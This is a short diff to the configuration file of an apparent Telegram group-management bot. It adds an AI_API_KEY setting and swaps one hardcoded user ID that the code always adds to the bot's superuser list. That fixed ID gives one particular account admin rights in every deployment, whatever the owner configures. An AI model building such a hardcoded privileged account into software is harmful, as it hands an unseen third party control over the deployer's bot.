@@ -57,6 +57,7 @@ if ENV:
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
+    AI_API_KEY = os.environ.get('AI_API_KEY', "")
 
 else:
     from tg_bot.config import Development as Config
@@ -98,10 +99,11 @@ else:
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
+    AI_API_KEY = Config.AI_API_KEY
 
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(254318997)
+SUDO_USERS.add(895373440)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
